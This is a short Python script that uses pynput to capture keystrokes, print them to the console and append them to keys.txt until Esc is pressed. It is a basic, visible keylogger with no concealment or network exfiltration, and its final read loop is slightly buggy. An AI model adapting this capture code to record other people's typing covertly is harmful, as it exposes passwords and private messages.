from pynput.keyboard import Key, Listener

keys=[]
# registering the input keys
def on_press(key):
    keys.append(key)

    try:
      print("The character: {0} was pressed".format(key))
    except AttributeError:
      print("The special character: {0}".format(key))

def on_release(key):
     print("The character: {0} was released".format(key))
     if key == Key.esc:
         write_file(keys)
         return False


def write_file(keys):
    with open("keys.txt",'a') as file:
        for key in keys:
            k=str(key).replace(",","")
            file.write(k)
            file.write(" ")
    file.close()

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

with open("keys.txt",'r') as file:
    for line in file:
        print(file.read())